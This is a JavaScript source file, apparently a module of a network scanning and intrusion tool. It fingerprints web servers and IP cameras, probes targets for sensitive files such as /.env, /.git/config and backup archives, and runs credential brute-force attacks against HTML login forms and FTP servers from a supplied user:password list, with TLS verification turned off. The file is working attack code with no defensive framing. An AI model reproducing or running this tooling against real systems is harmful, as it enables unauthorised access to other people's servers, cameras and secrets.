const http = require('http');
const https = require('https');
const net = require('net');
const { withTimeout } = require('../core/utils');

const SENSITIVE_PATHS = ['/.env', '/.git/config', '/admin', '/login', '/config.php', '/backup.zip'];

function getHttpInfo(ip, port, isHttps = false) {
    return withTimeout(new Promise((resolve) => {
        const client = isHttps ? https : http;
        const req = client.get({ host: ip, port: port, rejectUnauthorized: false }, (res) => {
            let data = ''; res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => {
                let server = res.headers['server'] || 'Unknown';
                let device = "Web Server 🌐";
                if (server.toLowerCase().includes('ipcamera') || data.toLowerCase().includes('dahua')) device = "IP Camera 🎥";
                if (server.toLowerCase().includes('iis')) device = "Windows Server 🖥️";
                const isLogin = data.toLowerCase().includes('<input type="password"') || data.toLowerCase().includes('type="password"');
                const titleMatch = data.match(/<title>(.*?)<\/title>/i);
                const title = titleMatch ? titleMatch[1].trim().substring(0, 30) : 'No Title';
                resolve({ server, title, status: res.statusCode, device, isLogin, rawData: data });
            });
        });
        req.on('error', () => resolve(null));
    }), 3000).catch(() => null);
}

async function webFuzz(ip, port, isHttps) {
    const found = []; const client = isHttps ? https : http;
    for (const path of SENSITIVE_PATHS) {
        await withTimeout(new Promise((resolve) => {
            const req = client.get({ host: ip, port: port, path: path, rejectUnauthorized: false }, (res) => {
                if ([200, 403, 401].includes(res.statusCode)) found.push(`${path} [${res.statusCode}]`);
                res.resume(); resolve();
            });
            req.on('error', () => resolve());
        }), 2000).catch(() => null);
    }
    return found;
}

async function bruteForceHttp(ip, port, isHttps, htmlData, credsList) {
    return new Promise(async (resolve) => {
        const formMatch = htmlData.match(/<form[^>]*action=["']([^"']*)["'][^>]*>/i);
        const postUrl = formMatch ? formMatch[1] : '/';
        const textMatch = htmlData.match(/<input[^>]*type=["'](text|email)["'][^>]*name=["']([^"']*)["']/i);
        const passMatch = htmlData.match(/<input[^>]*type=["']password["'][^>]*name=["']([^"']*)["']/i);
        if (!textMatch || !passMatch) return resolve(null);
        
        const client = isHttps ? https : http;
        for (const cred of credsList) {
            const [u, p] = cred.split(':');
            const postData = `${textMatch[2]}=${encodeURIComponent(u)}&${passMatch[2]}=${encodeURIComponent(p)}`;
            const success = await new Promise((res) => {
                const req = client.request({
                    host: ip, port: port, path: postUrl, method: 'POST', rejectUnauthorized: false,
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': Buffer.byteLength(postData) }
                }, (response) => {
                    let respData = ''; response.on('data', d => respData += d);
                    response.on('end', () => {
                        const isError = /invalid|incorrect|error|failed/i.test(respData);
                        res(response.statusCode === 302 || (!isError && respData.length > 0));
                    });
                });
                req.on('error', () => res(false));
                req.write(postData); req.end();
            });
            if (success) return resolve(`FOUND (${u}:${p})`);
        }
        resolve(null);
    });
}

async function bruteForceFtp(ip, credsList) {
    for (const cred of credsList) {
        const [u, p] = cred.split(':');
        const success = await new Promise((resolve) => {
            const client = new net.Socket(); client.setTimeout(3000);
            client.connect(21, ip);
            let step = 0;
            client.on('data', (data) => {
                const resp = data.toString();
                if (step === 0 && resp.includes('220')) { client.write(`USER ${u}\r\n`); step++; }
                else if (step === 1 && resp.includes('331')) { client.write(`PASS ${p}\r\n`); step++; }
                else if (step === 2) { resolve(resp.includes('230')); client.destroy(); }
            });
            client.on('error', () => { client.destroy(); resolve(false); });
            client.on('timeout', () => { client.destroy(); resolve(false); });
        });
        if (success) return `FOUND (${u}:${p})`;
    }
    return null;
}

module.exports = { getHttpInfo, webFuzz, bruteForceHttp, bruteForceFtp };
